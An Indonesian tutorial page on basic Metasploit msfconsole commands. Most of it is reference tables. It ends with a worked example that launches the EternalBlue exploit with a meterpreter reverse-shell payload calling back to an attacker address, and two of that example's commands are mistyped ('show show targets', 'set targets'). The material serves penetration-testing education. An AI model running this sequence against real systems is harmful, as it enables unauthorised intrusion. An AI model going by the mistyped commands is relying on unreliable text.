<p align="left"><b>Sebelumnya</b>: <a href="https://github.com/fixploit03/Belajar-Metasploit/blob/main/resource/Antarmuka%20Metasploit%20Framework.md">Antarmuka Metasploit Framework</a></p>

# Perintah Dasar MSFconsole

`msfconsole` adalah antarmuka utama untuk Metasploit Framework.

## Perintah Inti

| Perintah | Deskripsi |
|:--:|:--:|
| `?` | Menampilkan menu bantuan |
| `banner` | Menampilkan banner Metasploit yang keren |
| `cd` | Mengubah direktori kerja saat ini |
| `color` | Mengaktifkan atau menonaktifkan warna |
| `connect` | Berkomunikasi dengan sebuah host |    
| `debug` | Menampilkan informasi yang berguna untuk debugging |
| `exit` | Keluar dari konsol |
| `features` | Menampilkan daftar fitur yang belum dirilis namun bisa diaktifkan |
| `get` | Mengambil nilai dari variabel konteks-spesifik |
| `getg` | Mengambil nilai dari variabel global |
| `grep` | Menyaring output dari perintah lain menggunakan grep |
| `help` | Menampilkan menu bantuan | 
| `history` | Menampilkan riwayat perintah |
| `load` | Memuat plugin framework |
| `quit` | Keluar dari konsol |
| `repeat` | Mengulang daftar perintah |
| `route` | Merutekan lalu lintas melalui sebuah sesi |
| `save` | Menyimpan data aktif (datastore) |
| `sessions` | Menampilkan daftar sesi dan informasi tentang sesi |
| `set` | Mengatur variabel konteks-spesifik ke nilai tertentu |
| `setg` | Mengatur variabel global ke nilai tertentu |   
| `sleep` | Berdiam selama beberapa detik yang ditentukan |  
| `spool` | Menulis output konsol ke dalam file dan layar secara bersamaan |
| `threads` | Melihat dan mengelola thread latar belakang |
| `tips` | Menampilkan daftar tips produktivitas yang berguna |
| `unload` | Menghapus plugin framework yang dimuat |
| `unset` | Menghapus satu atau lebih variabel konteks-spesifik |
| `unsetg` | Menghapus satu atau lebih variabel global |
| `version` | Menampilkan versi framework dan pustaka konsol |

## Perintah Modul

| Perintah | Deskripsi |
|:--:|:--:|
| `advanced` | Menampilkan opsi lanjutan untuk satu atau lebih modul |
| `back` | Kembali ke konteks sebelumnya dari modul saat ini |
| `clearm` | Menghapus tumpukan modul |
| `favorite` | Menambahkan modul ke daftar modul favorit |
| `favorites` | Menampilkan daftar modul favorit (alias dari `show favorites`) |
| `info` | Menampilkan informasi tentang satu atau lebih modul |
| `listm` | Menampilkan daftar tumpukan modul |
| `loadpath` | Mencari dan memuat modul dari sebuah path |
| `options` | Menampilkan opsi global atau opsi untuk satu atau lebih modul |
| `popm` | Mengeluarkan modul terakhir dari tumpukan dan mengaktifkannya |
| `previous` | Mengatur modul yang terakhir dimuat sebagai modul aktif |
| `pushm` | Menambahkan modul aktif (atau daftar modul) ke dalam tumpukan modul |
| `reload_all` | Memuat ulang semua modul dari semua path modul yang telah didefinisikan |
| `search` | Mencari berdasarkan nama dan deskripsi modul |
| `show` | Menampilkan modul berdasarkan tipe tertentu atau semua modul |
| `use` | Berinteraksi dengan modul berdasarkan nama atau hasil pencarian/indeks |

## Perintah Job

| Perintah | Deskripsi |
|:--:|:--:|
| `handler` | Menjalankan handler payload sebagai sebuah job |
| `jobs` | Menampilkan dan mengelola daftar job yang berjalan |
| `kill` | Menghentikan (membunuh) sebuah job |
| `rename_job` | Mengganti nama sebuah job |

## Perintah Resource Script

| Perintah  | Deskripsi |
|:--:|:--:|
| `makerc` | Menyimpan semua perintah yang telah dijalankan ke dalam sebuah file |
| `resource` | Menjalankan perintah-perintah yang disimpan dalam sebuah file |

## Perintah Backend Database

| Perintah | Deskripsi |
|:--:|:--:|
| `analyze` | Menganalisis informasi database tentang alamat atau rentang alamat tertentu |
| `db_connect` | Terhubung ke layanan data yang sudah ada |
| `db_disconnect` | Memutuskan koneksi dari layanan data saat ini |
| `db_export` | Mengekspor isi database ke dalam sebuah file |
| `db_import` | Mengimpor file hasil pemindaian (jenis file akan terdeteksi otomatis) |
| `db_nmap` | Menjalankan nmap dan merekam output-nya secara otomatis |
| `db_rebuild_cache` | Membangun ulang cache modul yang disimpan di database (tidak disarankan) |
| `db_remove` | Menghapus entri layanan data yang tersimpan |
| `db_save` | Menyimpan koneksi layanan data saat ini sebagai default saat startup |
| `db_stats` | Menampilkan statistik database |
| `db_status` | Menampilkan status layanan data saat ini |
| `hosts` | Menampilkan semua host dalam database |
| `klist` | Menampilkan daftar tiket Kerberos di database |
| `loot` | Menampilkan semua loot dalam database |
| `notes` | Menampilkan semua catatan (notes) dalam database |
| `services` | Menampilkan semua layanan dalam database |
| `vulns` | Menampilkan semua kerentanan (vulnerabilities) dalam database |
| `workspace` | Berpindah antar workspace database |

## Perintah Backend Kredensial

| Perintah | Deskripsi |
|:--:|:--:|
| `creds`  | Menampilkan semua kredensial yang ada di database |

## Perintah Pengembang (Developer)

| Perintah | Deskripsi |
|:--:|:--:|
| `edit` | Mengedit modul saat ini atau file dengan editor pilihan |
| `irb` | Membuka shell interaktif Ruby dalam konteks saat ini |
| `log` | Menampilkan `framework.log` dan menggulir ke akhir jika memungkinkan |
| `pry` | Membuka debugger Pry pada modul saat ini atau pada kerangka Metasploit |
| `reload_lib` | Memuat ulang file pustaka Ruby dari path yang ditentukan |
| `time` | Menghitung berapa lama waktu yang dibutuhkan untuk menjalankan perintah tertentu |

## Perintah DNS

| Perintah | Deskripsi |
|----------|------------------------------------------------------------|
| `dns` | Mengelola perilaku resolving DNS di dalam Metasploit |

Untuk informasi lebih lanjut tentang perintah tertentu, gunakan `<perintah> -h` atau `help <perintah>`.

## Contoh Penggunaan Dasar

### Mencari Modul

```
search type:exploit platform:windows remote
```

Untuk pencarian lebih spesifik

```
search cve:2021 type:exploit
```

### Menggunakan Modul

```
# Menggunakan modul EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue

# Menampilkan opsi yang ada di modul ms17_010_eternalblue
show options

# Menggunakan payload windows/x64/meterpreter/reverse_tcp
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Setting alamat IP target yang ingin dieksploitasi
set RHOSTS 192.168.1.10

# Setting port SMB dari target (default: 445)
set RPORT 445

# Setting alamat IP lokal (attacker) yang akan menerima koneksi reverse
set LHOST 192.168.1.5

# Setting port lokal untuk koneksi reverse
set LPORT 4444

# Menampilkan daftar target yang didukung oleh modul
show show targets

# Memilih target yang sesuai dari daftar (misal: 1)
set targets 1

# Menjalankan eksploitasi
exploit
```

Itu dia perintah dasar MSFconsole.

<p align="right"><b>Selanjutnya</b>: <a href="https://github.com/fixploit03/Belajar-Metasploit/blob/main/resource/Jenis-Jenis%20Modul%20di%20Metasploit%20Framework.md">Jenis-Jenis Modul di Metasploit Framework</a></p>
